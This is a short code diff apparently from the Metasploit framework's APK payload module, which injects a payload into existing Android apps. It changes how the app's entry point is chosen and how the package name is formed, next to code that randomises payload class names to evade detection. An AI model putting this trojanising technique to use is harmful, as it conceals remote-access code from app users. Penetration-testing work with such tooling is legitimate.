@@ -41,10 +41,11 @@ class Msf::Payload::Apk
     application = amanifest.xpath('//application')
     application_name = application.attribute("name")
     if application_name
-      application_str = application_name.to_s
-      unless application_str == 'android.app.Application'
-        return application_str
-      end
+      return application_name.to_s
+      #application_str = application_name.to_s
+      #unless application_str == 'android.app.Application'
+        #return application_str
+      #end
     end
     activities = amanifest.xpath("//activity|//activity-alias")
     for activity in activities
@@ -224,7 +225,7 @@ class Msf::Payload::Apk
     FileUtils.rm Dir.glob("#{tempdir}/payload/smali/com/metasploit/stage/R*.smali")
 
     package = amanifest.xpath("//manifest").first['package']
-    package = package.downcase + ".#{Rex::Text::rand_text_alpha_lower(5)}"
+    package = package + ".#{Rex::Text::rand_text_alpha_lower(5)}"
     classes = {}
     classes['Payload'] = Rex::Text::rand_text_alpha_lower(5).capitalize
     classes['MainService'] = Rex::Text::rand_text_alpha_lower(5).capitalize
